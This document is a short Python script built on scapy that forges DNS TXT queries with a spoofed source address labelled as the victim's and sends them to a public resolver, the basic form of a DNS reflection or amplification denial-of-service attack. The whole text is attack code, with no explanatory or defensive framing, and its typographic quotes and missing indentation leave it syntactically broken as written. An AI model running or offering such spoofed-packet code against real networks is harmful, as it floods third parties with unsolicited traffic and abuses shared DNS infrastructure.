from scapy.all import *

victimIP=”192.168.3.100”
allDns = [ ”8.8.8.8”]
for dns in allDns:
p = IP (dst=dns,src=victimIP)
/UDP(dport=53)
/DNS(rd=1, qd=DNSQR(qname=”FAKENAME”,
qtype=”TXT”))
send (p)
